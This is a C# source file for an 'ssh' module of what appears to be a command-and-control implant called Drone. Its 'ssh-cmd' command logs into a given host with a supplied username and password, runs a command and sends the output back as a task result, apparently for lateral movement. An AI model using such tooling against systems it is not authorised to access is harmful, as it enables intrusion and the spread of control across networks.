using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;

using Drone.Models;
using Drone.Modules;

using Renci.SshNet;

namespace SshModule
{
    public class SshModule : DroneModule
    {
        public override string Name => "ssh";

        public override List<Command> Commands => new()
        {
            new Command("ssh-cmd", "Execute a command via SSH", ExecuteSsh,
                new List<Command.Argument>
                {
                    new("hostname", false),
                    new("username", false),
                    new("password", false),
                    new("command", false)
                })
        };

        private void ExecuteSsh(DroneTask task, CancellationToken token)
        {
            var target = task.Arguments[0];
            var username = task.Arguments[1];
            var password = task.Arguments[2];
            var command = string.Join(" ", task.Arguments.Skip(3));

            var connection = new ConnectionInfo(target, username,
                new PasswordAuthenticationMethod(username, password));

            using var client = new SshClient(connection);
            client.Connect();

            var sshCommand = client.RunCommand(command);

            var sb = new StringBuilder();
            sb.AppendLine(sshCommand.Result);
            sb.AppendLine(sshCommand.Error);
            
            Drone.SendResult(task.TaskGuid, sb.ToString());
        }
    }
}